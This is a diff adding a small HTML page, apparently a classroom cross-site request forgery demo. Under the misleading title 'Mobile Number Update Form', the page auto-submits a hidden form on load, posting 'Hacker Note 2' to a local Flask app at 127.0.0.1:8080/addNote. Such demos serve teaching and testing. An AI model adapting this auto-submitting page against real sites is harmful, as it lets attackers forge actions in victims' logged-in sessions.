@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!--
+        Author: Anthoniraj Amalanathan
+        Description: This is the cloned version of Python Flask HTML Page
+        Slightly modified with text box value and auto submit when body onload
+    -->
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Number Update Form</title>
+</head>
+<body onload="document.myform.submit()">
+    <h3>Update Your Mobile Number</h3>
+    <br>
+    <form action="http://127.0.0.1:8080/addNote" method="post" name="myform">
+        <input type="text" name="content" value="Hacker Note 2">
+        <button type="submit">Add Note</button>  
+    </form>
+</body>
+</html>
